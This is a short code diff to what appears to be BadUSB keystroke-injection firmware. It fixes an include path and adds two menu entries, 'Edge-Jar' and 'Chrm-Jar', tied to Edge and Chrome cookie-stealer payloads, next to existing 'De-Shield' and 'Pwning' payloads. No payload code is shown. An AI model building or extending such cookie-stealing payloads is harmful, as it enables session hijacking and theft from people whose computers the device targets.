@@ -2,15 +2,19 @@
 
 #include "../ui/TerminalTheme.h"
 #include "payloads/drop_upload/DropUpload.h"
-#include "payloads/De_Shield/DeShield.h"
+#include "payloads/de_shield/DeShield.h"
 #include "payloads/pwning/Pwning.h"
 #include "payloads/payload/Payload.h"
+#include "payloads/edge_jar/CookieStealer.h"
+#include "payloads/chrome_jar/ChromeCookieStealer.h"
 
 namespace {
 const BadUsbPayload kPayloads[] = {
     {"Drop & Upload", sendDropUploadKeys},
     {"De-Shield", sendDeShieldKeys},
     {"Pwning", sendPwningKeys},
+    {"Edge-Jar", sendCookieStealerKeys},
+    {"Chrm-Jar", sendChromeCookieStealerKeys},
     {"Payload", sendPayloadKeys},
 };
 
